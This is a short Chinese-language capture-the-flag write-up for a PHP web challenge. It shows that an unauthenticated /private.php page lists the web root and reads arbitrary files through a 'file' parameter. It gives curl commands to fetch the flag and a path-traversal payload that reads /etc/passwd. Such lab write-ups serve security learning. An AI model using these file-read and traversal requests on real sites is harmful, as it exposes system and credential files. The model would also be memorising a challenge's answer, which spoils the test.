## 题解

### 入口与指纹

PHP 站点 `XBOW App`，导航 `home/about/contact/login/private`。`/private.php` 未登录也能访问，
显示「Private Zone」。登录页 `test:test` 是干扰项（登录后 `/home.php` 也只是跳回首页）。

### 关键观察

`private.php` 有两个 GET 参数：

- `?action=1` → `scandir('.')`，把**网站根目录**列出来
- `?file=<path>` → `file_get_contents($file)`，把内容放进 `<pre>`

`?action=1` 的列表里直接出现 `xbow-flag.txt`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS "http://$T/private.php?action=1"            # 看到 xbow-flag.txt
curl -sS --get --data-urlencode 'file=xbow-flag.txt' "http://$T/private.php" \
| grep -o 'flag{[^}]*}'
```

`file` 同时是 LFI：`file=../../../../etc/passwd` 也能读。

### flag 位置

站点根目录的 `xbow-flag.txt`。

## 复盘

- 「Private Zone」不看登录也能进，先看它有没有参数。
- `scandir('.')` 型目录列表比字典爆破便宜：一次请求拿到全部文件名。
- `?file=` 往往是任意文件读；顺着目录列表读同名文件即可。
